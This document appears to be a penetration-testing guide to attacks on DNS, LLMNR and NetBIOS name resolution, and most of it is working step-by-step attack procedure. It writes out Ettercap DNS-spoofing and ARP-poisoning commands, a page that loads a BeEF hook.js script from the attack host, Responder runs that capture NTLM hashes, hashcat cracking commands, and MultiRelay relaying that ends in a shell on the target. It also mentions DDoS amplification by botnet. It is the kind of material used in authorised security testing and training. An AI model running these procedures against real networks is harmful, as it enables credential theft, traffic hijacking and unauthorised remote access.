# Name resolution skirmishes

Name-resolution exploits are exploits against technologies that resolve names to IP addresses, such as DNS, which works at the application layer and provides essential lookup services for devices connected to the Internet or a private network, the NetBIOS name service that converts computer names to IP addresses, and the Link-local Multicast Name Resolution (LLMNR) protocol that converts hostnames to an IPv4 or IPv6 address. Common name-resolution ports are UDP port 137 (NetBIOS name service), UDP 138 (NetBIOS datagram service), and TCP port 139 (NetBIOS session service).

Hacking name resolution protocols is like hacking the telephone book of the internet or intranet.

DNS offers a simple and silent variant of the man-in-the-middle attack (on-path attack, as it is now called). Most of the time you only have to spoof a single DNS response packet to hijack all packets of a connection.

LLMNR is a protocol that allows name resolution without the requirement of a DNS server. It is able to provide a hostname-to-IP based off a multicast packet sent across the network asking all listening Network-Interfaces to reply if they are authoritatively known as the hostname in the query. You only have to respond authoritatively you can give what is asked after authentication.

## DNS attacks

1. DNS cache snooping
2. DNS poisoning
3. DNS amplification for DDoS attacks on other servers
    2.1 Create a botnet to send thousands of lookup requests to open DNS servers (with a spoofed source address 
    and configured to maximise the amount of data returned by each DNS server)
4. DDoS attack against a DNS server itself

DNS cache poisoning, also known as DNS spoofing, exploits vulnerabilities in the domain name system DNS to divert Internet traffic away from legitimate servers and towards fake ones. This kind of attack is often used for pharming.

DNS amplification attacks exploit the open nature of DNS services to strengthen the force of distributed denial of service DDoS attacks.

A DDoS attack against a DNS server can cause it to crash, rendering the users who rely on the sever unable to browse the web (users will still be able to reach recently visited websites if the DNS record is saved in a local cache).

## DNS cache snooping

Example:

    nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={host1,host2,host3}' <target>

Arguments:

* `dns-cache-snoop.mode`: which of two supported snooping methods to use. 
  * `nonrecursive`, the default, checks if the server returns results for non-recursive queries. Some servers may disable this. 
  * `timed` measures the difference in time taken to resolve cached and non-cached hosts. This mode will pollute the DNS cache and can only be used once reliably.
* `dns-cache-snoop.domains`: an array of domain to check in place of the default list. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with "www." and once without.

The [nmap cache snooping script](https://nmap.org/nsedoc/scripts/dns-cache-snoop.html) can assist with cache snooping against an internal DNS server. Cache snooping shows where the targets are browsing on the Internet. This type of information disclosure can help aid in various attack scenarios:

* If knowing the websites the people (or a specific person) of an organisation frequents, a focused attack in which the web pages in the site are infected with malware is a possible attack vector (Waterholing).
* An attack method used to impersonate a victim’s DNS server, forcing them to navigate to a malicious website(DNS spoofing).
* The DNS resolver cache is overwritten on the DNS server with a malicious web address, and the user will receive the malicious site instead of the intended one (DNS cache poisoning).

## DNS spoofing

* DNS spoofing can be achieved by DNS redirection, an attack in which an adversary modifies a DNS server in order to redirect a specific domain name to a different IP address. In many cases, the new IP address will be for a server controlled by the adversary which contains files infected with malware. 
* Cache poisoning is another way to achieve DNS spoofing, without relying on DNS hijacking (physically taking over the DNS settings). An adversary inserts a forged DNS entry, containing an alternative IP destination for the same domain name, after which the DNS server resolves the domain to the spoofed website, until the cache is refreshed.
* DNS server spoofing attacks are often used to spread computer worms and viruses.
* This kind of attack is also often used for pharming.

## Example: DNS spoofing and cache poisoning

1. Use [Ettercap](https://www.ettercap-project.org): Modify the `/etc/ettercap/etter.dns` and add an entry to the file for the domain name "site.com" and have it point to the attack host.

```text
$ echo "site.com A <IP address attack host>" | sudo tee -a /etc/ettercap/etter.dns site.com A <IP address attack host>
```

2. Create a web page named `index.html` in the `/tmp` directory of the attack host to load a JavaScript [BeEF](https://www.kali.org/tools/beef-xss/) hook using the BeEF `hook.js` file:

```html
<HTML>
    <HEAD>
        <script src="http://site.com:3000/hook.js"></script>
    </HEAD>
    <BODY>
        You have been hooked!
    </BODY>
</HTML>
```

This is the web page the user will be directed to when they try to connect to `site.com`.

3. Use either the Python http server module to host the web page on port 80, OR move the file to `/var/www/html/` and start the apache2 server.

```text
# python -m SimpleHTTPServer 80
# service apache2 start
```

4. Launch and login to BeEF
5. Open a second terminal and use Nmap to identify other hosts by just using ARP packets by specifying the `-sn` flag 
to disable port scanning and using the `-n` flag to stop IP address resolution: 

```text
# sudo nmap -n -sn <IP address attack host>/24
```

6. With a target host system found (<IP address target>) on the local network, find the gateway address for the local 
network using the `ip route` command:

```text
# ip route
```

7. Establish an ARP poisoning session between the local network gateway (<IP address gateway>) and the target 
(<IP address target>)

```text
# ettercap -M arp:remote -T -q /<IP address gateway>// /<IP address target>//
```

* The `-M` flag sets up for MiTM (on-path), using the remote arp technique. 
* The `-T` argument puts it in text-only mode. 
* The `-q` argument prevents Ettercap from printing the full packet contents, to make the output more readable. 
* The last part is the gateway and target in the format: `MAC address/IPv4 addresses/IPv6 addresses/Ports`. Not using 
the MAC adress, IPv6 adressess or ports explains the blanks and the slash delimiters.

8. Enable the DNS plugin. Type `p` to list the plugins. Choose the `dns-spoof` plugin. When it is active and the 
victim navigates to the web page `http://site.com/index.html`, they will see the spoofed and hooked page. Inside
the terminal with Ettercap, you can see the spoof succeed.
9. To exit Ettercap, press q.
10. In BeEF, see the target machine under the Online Browsers tab. From here, use BeEF to exploit the target further.

## Example: Forging redirection records for poisoning

Redirect the target domain's name server (cache an additional A-record for ns.target.example:

```text
        +---------------------+
        | ANSWER              | (no response)
        +---------------------+
        | AUTHORITY           | adversary.example. 3600 IN NS ns.target.example.
        +---------------------+
        | ADDITIONAL          | ns.target.example. IN A xxx.xxx.xxx.xxx
        +---------------------+
```

Redirect the NS record to another target domain (cache unrelated authority information for target.example's NS-record):

```text
        +---------------------+
        | ANSWER              | (no response)
        +---------------------+
        | AUTHORITY           | target.example. 3600 IN NS ns.adversary.example.
        +---------------------+
        | ADDITIONAL          | ns.adversary.example. IN A xxx.xxx.xxx.xxx
        +---------------------+
```

## Attacking LLMNR and NetBIOS

LLMNR/NBT-NS poisoning can be done through SMB or through WPAD.

## Example: LLMNR/NBT-NS poisoning through SMB

When a Windows system tries to access an SMB share, it sends a request to the DNS server which then resolves the share name to the respective IP address and the requesting system can access it. When the provided share name does not exist, the system sends out an LLMNR query to the entire network. If any user (IP address) has access to that share, it can reply.

1. Use `ifconfig` to find NIC <interface> name of attack machine
2. Start responder with the NIC to listen for LLMNR requests on. The responder run 
starts LLMNR and NBT-NS poisoning by default:

```text
# responder -I <interface>
```

When a user in the same logical location as the attack host tries to access a non-existent shared drive. The drive 
has been made available and is asking for user credentials. Even if the user does not input credentials, the hashes 
will be obtained. Responder creates logs of every session. All the hashes dumped can be found in the folder 
`/usr/share/responder/logs`

3. Save the hashes in a file named `hash.txt` and use hashcat to crack it:

```text
# hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

* Module 5600 is the hash type to crack NetNTLMv2. 5500 is for NetNTLMv1/NetNTLMv1+ESS.

## Example: LLMNR/NBT-NS poisoning through WPAD

Web Proxy Autodiscovery Protocol is a method used by a browser to automatically locate and interface with cache services in a network so that information is delivered quickly. WPAD by default uses DHCP to locate a cache service to facilitate straightforward connectivity and name resolution.

In an organisation using a WPAD server, each browser is provided with the same proxy configurations using a file called `wpad.dat`. Any request going from any browser in a company domain first finds `wpad.dat` and then reads the configuration and finally sends the request to the destination.

1. Use `ifconfig` to find NIC <interface> name of attack machine
2. Start responder with the NIC and the options to configure a WPAD rogue proxy server (`w`) and
add the switch for DHCP injection (`d`:

```text
# responder -I <interface> -wd
```

When a user enters an invalid URL, the browser fails to load that page using DNS and sends out an LLMNR request to 
find a WPAD proxy server. This is by default in browsers that have "automatic configuration detection" enabled, 
an option often used in corporate networks to route traffic through a proxy. The browser then asks for `wpad.dat` which 
contains the proxy autoconfiguration data. 

Responder poisons and injects DHCP response with WPAD’s IP and the browser tries to authenticate to the WPAD server 
and gives a login prompt. When the user inputs credentials, the NLTM hashes are ours.
These can be viewed in the logs under the name HTTP-NTLMv2-<someIPv6Address>.txt

3. Use `hashcat` to crack it:

```text
# hashcat -m 5600 HTTP-NTLMv2-<someIPv6Address>.txt /usr/share/wordlists/rockyou.txt
```

Module `5600` is the hash type to crack NetNTLMv2. `5500` is for NetNTLMv1/NetNTLMv1+ESS.

## NTLM relay attack

1. Set up MultiRelay
2. Run responder
3. Wait for it

If it is possible to poison responses but not possible to crack the hash, an option is to try to relay. A relay or forwarder receives valid authentication and then forwards that request to another server/system and tries to authenticate to that server/system by using the valid credentials received.

* Activity can vary wildly depending on the network. 
* Inactive networks can take days or weeks before a connection can be hijacked. 
* Logs are created in `/usr/share/responder/logs` where you can look past sessions captured. 
* MultiRelay runs mimikatz by default and may be easily flagged by antivirus products. 
* The attack described here should only be performed when explicitly authorised to do so. 

## Example NTLM relay attack

1. Install dependencies and compile some artifacts used by Multirelay:

```text
# apt install gcc-mingw-w64-x86-64 python-crypto
# cd /usr/share/responder/tools/
# x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv                                                                                                         
# x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
# pip install pycryptodome
```

2. Test with:

```text
# cd /usr/share/responder/tools
# python3 MultiRelay.py
```

3. For this attack to work with SMB, SMB signing has to be disabled on the target. Usually it is disabled, but this can be checked using the nmap [smb-security-mode](https://nmap.org/nsedoc/scripts/smb-security-mode.html) script:

```text
# nmap -p445 --script=smb-security-mode <target IP address>
```

4. The MultiRelay script uses HTTP and SMB ports. To prevent conflicts, turn these servers off in the 
`/usr/share/responder/responder.conf` file.

```text
SMB = Off
HTTP = Off
```

5. If SMB signing is disabled, run MultiRelay with (`-t`) to specify the target and (`-u`) to specify users to relay (forward) to. Choose selectively to create minimal noise in the network.

```text
# python3 MultiRelay.py -t <target IP address> -u ALL -d
```

6. In another terminal, use `ifconfig` to find NIC <interface> of attack machine for running responder.
7. Run responder:

```text
# responder -I <interface> -rv
```
8. Wait for a connection: Hopefully, someone mistypes trying to open a shared drive (a drive that does not exist). Responder intervenes and poisons the request. SMB relaying is now setup in `MultiRelay.py`, and the credential is forwarded to the <target IP address> and we have gained a shell on it.
